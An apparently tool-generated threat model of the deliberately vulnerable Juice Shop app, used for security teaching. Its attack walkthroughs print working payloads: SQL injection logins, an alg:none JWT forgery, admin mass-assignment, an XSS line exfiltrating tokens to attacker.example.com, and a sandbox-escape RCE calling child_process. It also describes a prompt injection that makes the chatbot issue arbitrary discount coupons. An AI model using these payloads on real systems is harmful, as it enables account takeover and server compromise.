## Management Summary

### Verdict

🔴 Juice Shop carries an actively exploitable security posture: multiple critical weaknesses allow an unauthenticated attacker to take over any account, execute arbitrary server code, and exfiltrate the full customer database without prior access.

**Risk distribution:** 🔴 Critical: 11 · 🟠 High: 35 · 🟡 Medium: 15 · 🟢 Low: 0 · **Total: 61**<br/>**Assessment evidence:** 59 confirmed-exploitable finding(s) · 1 implementation weakness(es) · 7 design weakness(es)


**Scope:** 6 of 7 components received full STRIDE analysis - the externally-reachable, authentication-bearing, and business-critical surface. 1 further component(s) received a reduced-budget screening pass (all six STRIDE categories, no verification greps) and are marked `Screened` in the component table. (see [§1 Scope](#scope)).

<br/>

**The highest-priority scenarios an attacker can execute today:**

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 16px 20px; margin: 0;">

- **Full account takeover without a password** — Hardcoded signing keys and broken token verification let an attacker forge any user's login credential, including the admin account. *(🔴 [F-005](#f-005) — Hardcoded RSA Private Key (`lib/insecurity.ts:21`), 🔴 [F-006](#f-006) — Insecure JWT Verification, 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage (`login.component.ts:101`) → [W-003](#w-003))* — ✓ verified attack path
- **Customer database exposed via login form** — The login form passes user input directly into database queries without protection, giving an attacker the ability to read the entire user table. *(🔴 [F-004](#f-004) — SQL Injection on Login (`routes/login.ts:34`), 🔴 [F-008](#f-008) — SQL Injection → [W-001](#w-001))*
- **Arbitrary server code execution** — A file-upload and a business-order channel both evaluate untrusted content as code, allowing a remote attacker to run commands on the server. *(🔴 [F-009](#f-009) — Remote Code Execution via safeEval in B2B Order API (`routes/b2bOrder.ts`), 🟠 [F-022](#f-022) — XML External Entity Injection via File Upload (`routes/fileUpload.ts`))*
- **Stolen login sessions via browser attacks** — Active logins are stored where malicious page content can reach them, and the application reflects user input as executable script in search results. *(🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage (`login.component.ts:101`), 🔴 [F-027](#f-027) — Cross-Site Scripting (XSS))* — ✓ verified attack path
- **AI chatbot manipulated into granting unapproved discounts** — The chatbot executes coupon-generation tool calls without server-side policy checks, letting any user instruct it to produce arbitrary discount codes. *(🔴 [F-011](#f-011) — Prompt Injection overrides coupon discount policy (`routes/chat.ts:179`), 🟠 [F-043](#f-043) — LLM Excessive Agency via Unrestricted Coupon-Generation Tool (`routes/chat.ts`), 🟠 [F-047](#f-047) — Excessive LLM Tool Agency generateCoupon executes without server-side discount…)*
- **Crypto wallet keys exposed in source code** — A hardcoded wallet seed phrase gives any reader of the repository full control over the application's on-chain assets. *(🔴 [F-012](#f-012) — Hardcoded BIP-39 Mnemonic (`routes/checkKeys.ts:10`) → [W-003](#w-003))* — ✓ verified attack path
- **Build pipeline can inject malicious code into releases** — Unpinned third-party build actions and unverified installer scripts allow a supply-chain attacker to alter production artifacts. *(🟠 [F-025](#f-025) — Remote Script Execution via Unverified Installer (`ci.yml:358`), 🟠 [F-026](#f-026) — Unpinned GitHub Actions Allow Supply Chain Code Injection → [W-006](#w-006))*

</blockquote>

<br/>

Remediation must prioritize the Critical class: rotate hardcoded keys, fix token verification, and parameterize database queries before any other work.

### Top Weaknesses

The systemic root-cause problems behind the findings - the classes to fix, not just individual bugs. Each links to the full [Weakness Register](#7-weakness-register) with its findings and remediation.

- 🔴 **[W-001](#w-001) - Database access relies on concatenated queries** (Critical) - Database queries are assembled from application values instead of passing those values through an enforced parameterised data-access path. _Proven by [F-004](#f-004), [F-008](#f-008)._
- 🔴 **[W-002](#w-002) - Authorization is implemented route by route** (Critical) - Authorization depends on per-handler checks instead of a policy boundary that consistently enforces role, ownership, and tenant scope. _Proven by [F-003](#f-003), [F-010](#f-010), [F-028](#f-028) (+1 more)._
- 🔴 **[W-003](#w-003) - Secrets are committed to source instead of a managed store** (Critical) - Cryptographic keys, credentials, and other high-entropy secrets are embedded as literals in source or config rather than resolved at runtime from a managed secret store, so anyone with repository r… _Proven by [F-005](#f-005), [F-012](#f-012), [F-015](#f-015) (+2 more)._
- 🟠 **[W-004](#w-004) - Endpoints are reachable without enforced authentication** (High) - Sensitive API routes and real-time channels are exposed without an enforced authentication check at the endpoint boundary. _Proven by [F-048](#f-048), [F-051](#f-051)._
- 🟠 **[W-005](#w-005) - Input handling lacks enforced boundary validation** (High) - Request handlers do not validate input against one enforced server-side schema or allowlist at the boundary - validation is either absent on the vulnerable parameters or limited to rejecting select… _Proven by [F-018](#f-018), [F-019](#f-019)._
- 🟠 **[W-006](#w-006) - Build pipeline trusts mutable third-party references** (High) - CI/CD workflows resolve third-party actions and other build dependencies to mutable tags or branches instead of immutable commit digests, so a retagged or compromised upstream runs inside the pipel… _Proven by [F-025](#f-025), [F-032](#f-032)._

### Security Posture & Top Threats

**Figure 1 - Architecture & Top Threats**

Architecture tiers top-to-bottom (External Actors → Client → Application → Data) with the top threats per component. The in-figure legend on the right explains the attack scenarios, severity dots and symbols. Dashed slate lines mark trust-boundary crossings, labelled with the `tb-N` ids catalogued in [§1 Trust Boundaries](#trust-boundaries).

![Figure 1 - Architecture & Top Threats](threat-model-juice-shop-thorough-v0.5.2.figure1.svg)

**Figure 2 - Risk Flow: Actor → Tier → Impact**

Heatmap: **actors** (left) → **architecture tiers** (middle, Client → Application → Data) → **impact** (right). Numbered red arrows ①–⑦ are the threats enumerated in the Top Threats table below.

![Figure 2 - Risk Flow: Actor to Tier to Impact](threat-model-juice-shop-thorough-v0.5.2.figure2.svg)

**Threat actors.** The actors below drive the numbered attack paths in the figures above. The **Shop User** is the *victim* of client-side attacks (XSS / CSRF), not an attacker - in Figure 2 the compromise surfaces as the resulting business-impact node rather than as a separate actor box.

- **Shop User** — legitimate customer; target of client-side attacks; target of ⑥ Output Encoding / Cross-Site Scripting.
- **Anonymous Internet Attacker** — no account; registers in seconds when needed; drives ① Insecure Query Construction & Data Access, ② Hardcoded Secrets & Weak Cryptography, ④ Remote Code Execution (unsafe eval), ⑤ Sensitive File & Secret Exposure, ⑦ CSRF / Permissive CORS.
- **Authenticated Internet Attacker** — owns a regular account; logged in; drives ③ Broken Authorization & Access Control.

**7 structural threats**, grouped by weakness class - each row is one threat, not one finding. *Threat Description* states the general architectural weakness (STRIDE in brackets); *Findings* lists the concrete instances, each linked to [§8 Findings Register](#8-findings-register) with its component; *Risk & Impact* combines severity with business consequence.

| <a id="path-cross-site-scripting"></a>⑥ | **Output Encoding / Cross-Site Scripting** _(T·I)_<br/>Search results and user-generated content are rendered as trusted HTML, enabling an attacker to steal active session tokens from other users. | <span style="white-space:nowrap">🔴&nbsp;[F-027](#f-027)</span> - Cross-Site Scripting (XSS) (`search-result.component.ts:143`) <span style="white-space:nowrap">→&nbsp;[C-01](#c-01)</span>&nbsp;Frontend SPA<br/><span style="white-space:nowrap">🔴&nbsp;[F-001](#f-001)</span> - JWT and 2FA Temporary Token Stored in localStorage (`login.component.ts:101`) <span style="white-space:nowrap">→&nbsp;[C-01](#c-01)</span>&nbsp;Frontend SPA | 🔴 **Critical**<br/>Customer Session Hijack | <span style="white-space:nowrap">● [M-001](#m-001)</span> — Store session tokens in HttpOnly, Secure cookies<br/><span style="white-space:nowrap">◕ [M-026](#m-026)</span> — Encode output instead of bypassing the framework sanitizer |
| <a id="path-cross-site-request-forgery"></a>⑦ | **CSRF / Permissive CORS** _(S·T)_<br/>The password-change endpoint accepts credentials via GET parameters, exposing them in server logs and browser history for credential theft. | <span style="white-space:nowrap">🟡&nbsp;[F-055](#f-055)</span> - Password Credentials Logged via GET-Based Password Change (`changePassword.ts:14`) <span style="white-space:nowrap">→&nbsp;[C-02](#c-02)</span>&nbsp;Backend API (Express + Socket\.IO) | 🟡 **Medium**<br/>Customer Session Hijack | <span style="white-space:nowrap">◑ [M-054](#m-054)</span> — Move password change to POST with body parameters and enforce current-password… |

_STRIDE: S spoofing · T tampering · R repudiation · I information disclosure · D denial of service · E elevation of privilege. Risk, findings, components, impact and Fix are derived deterministically; only the one-line weakness description is authored._

**Verified attack chains.** 3 fully viable ([AC-T-001](#ac-t-001), [AC-T-002](#ac-t-002), [AC-T-005](#ac-t-005)); 1 partially blocked ([AC-T-006](#ac-t-006)). These chains combine individual findings into end-to-end exploitation paths verified step-by-step against the code - see [§9 Abuse Cases](#9-abuse-cases) for the per-step breakdown and blocking mitigations.

### AI / LLM Exposure

Juice Shop embeds an LLM chatbot with tool-calling authority over coupon generation, creating a direct path from user-supplied chat messages to business-logic execution. See **[§6 Security Architecture](#6-security-architecture)** for the per-control detail.



- **[LLM01](https://genai.owasp.org/llmrisk/llm01/) Prompt Injection** — User chat messages are concatenated into the model context without sanitization, allowing any user to override the system prompt and instruct the chatbot to issue arbitrary discount coupons as a Critical-severity structural defect, not a configuration gap. _([C-04](#c-04) — LLM Chatbot Service, [C-02](#c-02) — Backend API (Express + Socket\.IO))_
  - ↳ 🔴 [F-011](#f-011) — Prompt injection overrides coupon discount policy (`chat.ts:179`)
  - ↳ 🟠 [F-020](#f-020) — LLM prompt injection via unsanitised chat messages (`chat.ts:191`)

- **[LLM06](https://genai.owasp.org/llmrisk/llm06/) / [ASI02](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) Excessive Agency** — The generateCoupon tool executes coupon-creation without any server-side policy check on discount value or eligibility, so a successful prompt injection — or a misbehaving model response — results in real financial loss with no back-end safeguard. _([C-04](#c-04) — LLM Chatbot Service, [C-02](#c-02) — Backend API (Express + Socket\.IO))_
  - ↳ 🟠 [F-043](#f-043) — LLM excessive agency via unrestricted coupon-generation tool (`chat.ts:184`)
  - ↳ 🟠 [F-047](#f-047) — generateCoupon executes without server-side discount cap (`chat.ts:184`)

- **[LLM07](https://genai.owasp.org/llmrisk/llm07/) System Prompt Leakage** — The system prompt encodes confidential business rules and coupon policy details; an attacker who extracts it obtains the full discount policy without needing to exploit any other vulnerability. _([C-04](#c-04) — LLM Chatbot Service, [C-02](#c-02) — Backend API (Express + Socket\.IO))_
  - ↳ 🟠 [F-037](#f-037) — System prompt leakage of confidential business policy (`chat.ts:104`)

- **[LLM10](https://genai.owasp.org/llmrisk/llm10/) Unbounded Consumption** — The LLM chat endpoint has no rate limiting, so any unauthenticated or authenticated user can send unlimited requests, exhausting model API token budgets and potentially rendering the chatbot unavailable. _([C-04](#c-04) — LLM Chatbot Service, [C-02](#c-02) — Backend API (Express + Socket\.IO))_
  - ↳ 🟠 [F-041](#f-041) — Missing rate limiting on LLM chat endpoint (`server.ts:638`)

Operational controls rated Adequate or Partial - grouped into broad clusters (full per-control breakdown in [§6](#6-security-architecture)). Clusters demoted to Weak by open Critical/High findings appear in [§6](#6-security-architecture) instead, not here.

## 1. System Overview

Probably the most modern and sophisticated insecure web application

**Repository:** `https://github.com/juice-shop/juice-shop.git`
**Runtime:** Node\.js 22 - 26

### Scope

This threat model covers 7 components of juice-shop: **Frontend SPA**, **Backend API (Express + Socket\.IO)**, **Data Store (SQLite + Sequelize)**, **LLM Chatbot Service**, **CI/CD Pipeline (GitHub Actions)**, **Authentication & Session Surface**, **Web3 / Wallet / NFT Surface**.

All 7 modeled components received full STRIDE threat analysis.

**Out of scope:** third-party hosted dependencies, browser runtime, operating-system kernel, and the underlying network infrastructure.

---

### Trust Boundaries

Canonical boundary crossings. **Assumption & verdict** names the condition that makes each crossing safe and whether this report still supports it, judged one condition at a time - which conditions apply follows from the direction of the crossing.

</tbody>
</table>

_Exposure, most exposed first: ⚠ Review (endpoints unresolved) · 🌐 External (reached from outside the model) · ◐ Unverified (crossing not confirmed) · 🔒 Internal (both ends modelled) · ↗ Egress (reaches outside the model)._

_Kind - the crossing mechanism (build pipeline, in-process, network), then after `·` what changes across it: data-origin, identity, operator, privilege, tenant. Shown alone, nothing changes._

_Conditions - **inbound**: validation, authentication, authorization · **outbound**: egress content, egress destination, response trust (replies are untrusted input) · **internal**: query construction (data never becomes program text), authentication, authorization._

_Verdict per condition - **broken**: a linked finding proves the gap · in doubt: related findings, none linked here · not examined: nothing bears on it. `N related` counts further findings on the same condition. Linked findings sit under the condition they break, or under _Unattributed_. A link raises effective severity only at a confirmed internet ingress; raw risk never changes._

_Identical on every row, so stated once here instead of in a column: source `detected` (derived from inspected repository evidence); status `resolved`. Any row that deviates is shown in the table._

## 2. Architecture Diagrams

### 2.1 System Context

Who interacts with juice-shop from the outside, and through which channels. Solid arrows show normal usage; dashed red arrows mark unauthenticated probing or exploit paths (C4 Level 1).

```mermaid
flowchart LR
    USER["End User<br/>(browser)"]
    ATTACKER["Anonymous<br/>Internet Attacker"]
    subgraph TBEDGE["Trust boundary · external → backend-api (tb-1)<br/>external → auth (tb-2)<br/>+1 more"]
        SYSTEM["juice-shop"]

    USER -->|HTTPS · normal usage| SYSTEM
    ATTACKER -.->|HTTPS · probing / exploit| SYSTEM
```

**Key takeaway:** Every actor in the context interacts with juice-shop through its external interface, so authentication and input validation at that edge govern the entire attack surface.

## 3. Attack Walkthroughs

This section walks through how the **8 highest-priority of 11 Critical findings** are exploited - the chain entry points and those closest to a breach. Each walkthrough has attack steps, a focused sequence diagram, and the primary mitigation. How weaknesses combine toward the worst-case goal is in the [Critical Attack Tree](#critical-attack-tree); every other Critical, plus full per-finding context (severity rationale, assets, detection signals), is in the [§8 Findings Register](#8-findings-register).

### 3.1 SQL Injection on Login in Authentication and Session Surface

**Source:** 🔴 [F-004](#f-004) — `routes/login.ts:34`

Severity **Critical** ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Spoofing. See [§8 F-004](#f-004) for the full register row.

**Attack Steps**

1. An attacker sends `POST /rest/user/login` with body `{"email":"' OR '1'='1'--","password":"x"}`.
2. The raw `models.sequelize.query()` call at `routes/login.ts:34` interpolates `req.body.email` directly into the SQL string, causing the WHERE clause to match every row.
3. The query returns the first user (the seeded admin), and `afterLogin()` issues a signed JWT for that account, granting the attacker admin-level access.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: auth - routes/login.ts:34
    Note over DB: Database
    Attacker->>API: POST /rest/user/login with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-004
        Attacker->>API: The attacker sends the exploit for F-004
        API-->>Attacker: Exploit succeeds
    else After M-004 — Use parameterized database queries
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-004](#m-004) (Use parameterized database queries) lands, 🔴 [F-004](#f-004) — SQL Injection on Login (`routes/login.ts:34`) is exploitable at `routes/login.ts:34` (Critical-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-004](#m-004) (Use parameterized database queries)

### 3.2 Insecure JWT Verification in Backend API Express Socket IO

**Source:** 🔴 [F-006](#f-006) — `lib/insecurity.ts:52`

Severity **Critical** ([CWE-347](https://cwe.mitre.org/data/definitions/347.html)). STRIDE: Spoofing. See [§8 F-006](#f-006) for the full register row.

**Attack Steps**

1. An attacker crafts a JWT header `{"alg":"none","typ":"JWT"}` and a payload `{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"iat":1}`, base64url-encodes both parts, and appends an empty signature segment.
2. The attacker sends the forged token as `Authorization: Bearer <token>` to a protected endpoint such as `GET /api/Users`.
3. The server's `isAuthorized()` middleware accepts the unsigned token because jsonwebtoken 0.4.0 treats `alg:none` as a valid no-signature mode.
4. The attacker receives the full user list with email addresses and password hashes, confirming authentication bypass.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: backend-api - lib/insecurity.ts:52
    Attacker->>App: The attacker sends a crafted request targeting lib/insecurity.ts line 52
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-347
    alt Current state — F-006
        Attacker->>App: The attacker sends the exploit for F-006
        App-->>Attacker: Exploit succeeds
    else After M-006 — Enforce JWT signature and algorithm verification
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-006](#m-006) (Enforce JWT signature and algorithm verification) lands, 🔴 [F-006](#f-006) — Insecure JWT Verification is exploitable at `lib/insecurity.ts:52` (Critical-severity, [CWE-347](https://cwe.mitre.org/data/definitions/347.html)).

**Defense in Depth**

- Primary mitigation: ● [M-006](#m-006) (Enforce JWT signature and algorithm verification)

### 3.3 SQL Injection in Login

**Source:** 🔴 [F-008](#f-008) — `routes/login.ts:34`

Severity **Critical** ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Tampering. See [§8 F-008](#f-008) for the full register row.

**Attack Steps**

1. An attacker sends `POST /rest/user/login` with JSON body `{"email": "admin@juice-sh.op'--", "password": "x"}`.
2. The server constructs `SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...' AND deletedAt IS NULL`, where `--` comments out the password and deletedAt checks.
3. SQLite returns the admin user row, and the server issues a valid `RS256` JWT for the admin account.
4. The attacker uses the admin JWT to reach every protected endpoint, including `/api/Users`, order history, and accounting routes.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: backend-api - routes/login.ts:34
    Note over DB: Database
    Attacker->>API: POST /rest/user/login with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-008
        Attacker->>API: The attacker sends the exploit for F-008
        API-->>Attacker: Exploit succeeds
    else After M-004 — Use parameterized database queries
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-004](#m-004) (Use parameterized database queries) lands, 🔴 [F-008](#f-008) — SQL Injection is exploitable at `routes/login.ts:34` (Critical-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-004](#m-004) (Use parameterized database queries)

### 3.4 Mass Assignment in Backend API Express Socket IO

**Source:** 🔴 [F-013](#f-013) — `server.ts:501`

Severity **Critical** ([CWE-915](https://cwe.mitre.org/data/definitions/915.html)). STRIDE: Elevation of Privilege. See [§8 F-013](#f-013) for the full register row.

**Attack Steps**

1. An attacker sends `POST /api/Users` with body `{"email": "evil@example.com", "password": "secret", "passwordRepeat": "secret", "role": "admin"}` without any authentication.
2. Finale's generic create handler writes all non-excluded model fields including `role: 'admin'` to the Users table.
3. The attacker logs in with the new account and receives a JWT embedding `role: 'admin'`.
4. The attacker uses the admin JWT to access all admin-gated endpoints and other users' data.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: backend-api - server.ts:501
    Attacker->>App: The attacker sends a crafted request targeting server.ts line 501
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-915
    alt Current state — F-013
        Attacker->>App: The attacker sends the exploit for F-013
        App-->>Attacker: Exploit succeeds
    else After M-012 — Allowlist client-controlled fields
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-012](#m-012) (Allowlist client-controlled fields) lands, 🔴 [F-013](#f-013) — Mass Assignment via Finale Auto-Generated CRUD API (`server.ts`) is exploitable at `server.ts:501` (Critical-severity, [CWE-915](https://cwe.mitre.org/data/definitions/915.html)).

**Defense in Depth**

- Primary mitigation: ● [M-012](#m-012) (Allowlist client-controlled fields)

### 3.5 JWT and 2FA Temporary Token Stored in localStorage

**Source:** 🔴 [F-001](#f-001) — `frontend/src/app/login/login.component.ts:101`

Severity **Critical** ([CWE-922](https://cwe.mitre.org/data/definitions/922.html)). STRIDE: Information Disclosure. See [§8 F-001](#f-001) for the full register row.

**Attack Steps**

1. An attacker crafts a URL targeting the reflected XSS at `search-result.component.ts:143`, e.g., `/#/search?q=<img src=x onerror=fetch('https://attacker.example.com/?t='+localStorage.getItem('token'))>`.
2. The attacker delivers the URL to a logged-in victim via a phishing message; the victim's Angular app bypasses the sanitizer and renders the payload.
3. The injected script reads `localStorage.getItem('token')` (and optionally `totp_tmp_token`) and exfiltrates both values to the attacker's endpoint.
4. The attacker replays the stolen JWT against `/rest/user/whoami` and all authenticated API endpoints, fully impersonating the victim.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: frontend-spa - frontend/src/app/login/login.component.ts:101
    Attacker->>App: The attacker sends a crafted request targeting frontend/src/app/login/login.component.ts line 101
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-922
    alt Current state — F-001
        Attacker->>App: The attacker sends the exploit for F-001
        App-->>Attacker: Exploit succeeds
    else After M-001 — Store session tokens in HttpOnly, Secure cookies
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-001](#m-001) (Store session tokens in HttpOnly, Secure cookies) lands, 🔴 [F-001](#f-001) — JWT and 2FA Temporary Token Stored in localStorage (`login.component.ts:101`) is exploitable at `frontend/src/app/login/login.component.ts:101` (Critical-severity, [CWE-922](https://cwe.mitre.org/data/definitions/922.html)).

**Defense in Depth**

- Primary mitigation: ● [M-001](#m-001) (Store session tokens in HttpOnly, Secure cookies)

### 3.6 Hardcoded RSA Private Key in Authentication and Session Surface

**Source:** 🔴 [F-005](#f-005) — `lib/insecurity.ts:21`

Severity **Critical** ([CWE-321](https://cwe.mitre.org/data/definitions/321.html)). STRIDE: Spoofing. See [§8 F-005](#f-005) for the full register row.

**Attack Steps**

1. An attacker clones the public juice-shop repository and reads the private key PEM literal at `lib/insecurity.ts:21`.
2. The attacker signs a JWT locally with `jwt.sign({ data: { email: 'admin@juice-sh.op', role: 'admin' } }, privateKey, { algorithm: 'RS256', expiresIn: '6h' })` without touching the login endpoint.
3. The attacker presents the forged JWT in the `Authorization: Bearer` header to any endpoint protected by `security.isAuthorized()` and is accepted as admin.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant Repo
    participant App
    Note over Repo: Public repository
    Note over App: auth - lib/insecurity.ts:21
    Attacker->>Repo: Clone or browse - extract private key from lib/insecurity.ts line 21
    Attacker->>Attacker: Sign forged token / signature with the extracted key
    Attacker->>App: Submit forged artefact in normal authentication flow
    App-->>Attacker: Request accepted as authentic - signature validates
    alt Current state — F-005
        Attacker->>Repo: The attacker sends the exploit for F-005
        Repo-->>Attacker: Exploit succeeds
    else After M-005 — Move cryptographic keys to a managed secret store
        Attacker->>Repo: The attacker retries the same request after the fix
        Repo-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-005](#m-005) (Move cryptographic keys to a managed secret store) lands, 🔴 [F-005](#f-005) — Hardcoded RSA Private Key (`lib/insecurity.ts:21`) is exploitable at `lib/insecurity.ts:21` (Critical-severity, [CWE-321](https://cwe.mitre.org/data/definitions/321.html)).

**Defense in Depth**

- Primary mitigation: ● [M-005](#m-005) (Move cryptographic keys to a managed secret store)

### 3.7 Hardcoded BIP-39 Mnemonic in Check Keys

**Source:** 🔴 [F-012](#f-012) — `routes/checkKeys.ts:10`

Severity **Critical** ([CWE-798](https://cwe.mitre.org/data/definitions/798.html)). STRIDE: Information Disclosure. See [§8 F-012](#f-012) for the full register row.

**Attack Steps**

1. An attacker clones or browses the Juice Shop repository and reads `routes/checkKeys.ts:10` to obtain the BIP-39 mnemonic.
2. The attacker calls `HDNodeWallet.fromPhrase(mnemonic)` locally to derive the wallet private key without any server interaction.
3. The attacker uses the private key to sign Sepolia transactions, draining any ETH or NFTs held by the derived wallet address.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: web3-nft - routes/checkKeys.ts:10
    Attacker->>App: The attacker sends a crafted request targeting routes/checkKeys.ts line 10
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-798
    alt Current state — F-012
        Attacker->>App: The attacker sends the exploit for F-012
        App-->>Attacker: Exploit succeeds
    else After M-011 — Move secrets to a managed secret store
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-011](#m-011) (Move secrets to a managed secret store) lands, 🔴 [F-012](#f-012) — Hardcoded BIP-39 Mnemonic (`routes/checkKeys.ts:10`) is exploitable at `routes/checkKeys.ts:10` (Critical-severity, [CWE-798](https://cwe.mitre.org/data/definitions/798.html)).

**Defense in Depth**

- Primary mitigation: ● [M-011](#m-011) (Move secrets to a managed secret store)

### 3.8 Remote Code Execution in Backend API Express Socket IO

**Source:** 🔴 [F-009](#f-009) — `routes/b2bOrder.ts:23`

Severity **Critical** ([CWE-94](https://cwe.mitre.org/data/definitions/94.html)). STRIDE: Tampering. See [§8 F-009](#f-009) for the full register row.

**Attack Steps**

1. An attacker authenticates and sends `POST /b2b/v2/orders` with body `{"orderLinesData": "(function(){return this})().process.mainModule.require('child_process').execSync('id').toString()", "cid": "1"}`.
2. The `vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })` call executes the payload inside the `notevil`/vm sandbox.
3. The attacker exploits a `notevil` bypass to reach the outer process context and achieve RCE on the host.
4. The attacker reads environment variables, application secrets, or establishes a reverse shell.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant Sandbox
    Note over API: backend-api - routes/b2bOrder.ts:23
    Note over Sandbox: Eval / VM context
    Attacker->>API: POST /b2b/v2/orders with JS payload escaping the sandbox
    API->>Sandbox: Pass attacker-controlled code to eval / vm.runInContext
    Sandbox->>Sandbox: Prototype-walk reaches the host realm - RCE
    API-->>Attacker: Command output / arbitrary side effects
    alt Current state — F-009
        Attacker->>API: The attacker sends the exploit for F-009
        API-->>Attacker: Exploit succeeds
    else After M-008 — Remove server-side evaluation of untrusted input
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-008](#m-008) (Remove server-side evaluation of untrusted input) lands, 🔴 [F-009](#f-009) — Remote Code Execution via safeEval in B2B Order API (`routes/b2bOrder.ts`) is exploitable at `routes/b2bOrder.ts:23` (Critical-severity, [CWE-94](https://cwe.mitre.org/data/definitions/94.html)).

**Defense in Depth**

- Primary mitigation: ● [M-008](#m-008) (Remove server-side evaluation of untrusted input)

## 4. Assets

Information assets and the classification level that drives the Confidentiality / Integrity / Availability targets used in [§8 Findings Register](#8-findings-register) risk scoring.

| Asset | Classification | Description |
|----------------------|--------------|------------------------------------|
| User Credentials (Email + Password Hash) | Restricted | User email addresses and bcrypt/MD5 password<br/>hashes stored in the SQLite users table.<br/>These are the primary authentication tokens<br/>for the application - compromise enables<br/>account takeover for all registered users.<br/>No evidence of bcrypt usage despite<br/>dependency declaration; `MD5` or plaintext may<br/>be in use per recon. |
| JWT Bearer Tokens (Session Tokens) | Restricted | JWT tokens signed with a private key<br/>(`lib/insecurity.ts`) and stored in browser<br/>localStorage. Carried in Authorization:<br/>Bearer headers on every API request. Tokens<br/>cannot be revoked server-side - theft<br/>persists until natural expiry. Outdated<br/>jsonwebtoken 0.4.0 library is in use. |
| JWT Signing Key | Restricted | RSA private key (or HMAC secret) used to<br/>sign and verify all application JWTs.<br/>Located in `lib/insecurity.ts`. If the key is<br/>hardcoded or discoverable, attackers can<br/>forge arbitrary admin tokens without<br/>authentication. The outdated jsonwebtoken<br/>library may allow `alg:none` bypass<br/>independently of key compromise. |
| CI/CD Secrets and Build Tokens (GitHub<br/>Actions) | Restricted | `GITHUB_TOKEN` and any repository secrets used<br/>by GitHub Actions workflows for package<br/>publishing, Docker image push, and<br/>deployment. Token permissions are overly<br/>broad (no per-workflow permission scoping),<br/>enabling supply chain attacks via malicious<br/>workflow code. |
| Web3 Wallet Keys and NFT Assets | Restricted | Ethereum wallet private keys and NFT<br/>ownership records used by the web3-nft<br/>challenge surface (`routes/checkKeys.ts`,<br/>`routes/nftMint.ts`). Key material may be<br/>hardcoded or stored in the application for<br/>challenge purposes. Compromise enables<br/>on-chain asset theft or NFT minting abuse. |
| User PII (Profile Data, Addresses, Security<br/>Answers) | Confidential | User personal data including full names,<br/>email addresses, delivery addresses, and<br/>security question answers stored across the<br/>SQLite users, addresses, and<br/>security-answers tables. Accessible via<br/>authenticated REST endpoints; IDOR on<br/>numeric IDs allows cross-user data leakage. |
| Order and Basket Data (Financial Records) | Confidential | Customer basket contents and order history<br/>stored in SQLite baskets/basket-items/orders<br/>tables. Basket IDs are sequential integers<br/>(predictable), enabling IDOR access to any<br/>user's current order. Order history contains<br/>purchase records that could reveal user<br/>behaviour or purchasing power. |
| Application Configuration (config/*.yml) | Confidential | YAML configuration files<br/>(`config/default.yml`, `config/ctf.yml`, etc.)<br/>containing application secrets, chatbot LLM<br/>endpoint URLs, feature flags, and branding.<br/>Some configs include challenge unlock keys.<br/>Not stored in the database but committed to<br/>the public GitHub repository, making their<br/>contents attacker-visible. |
| Product Catalogue and Reviews | Internal | Product descriptions, pricing, images, and<br/>user-submitted reviews stored in SQLite and<br/>served via REST API. Reviews can contain<br/>HTML content rendered with DomSanitizer<br/>bypass - stored XSS vector. Product data<br/>itself is public but admin-modifiable. |
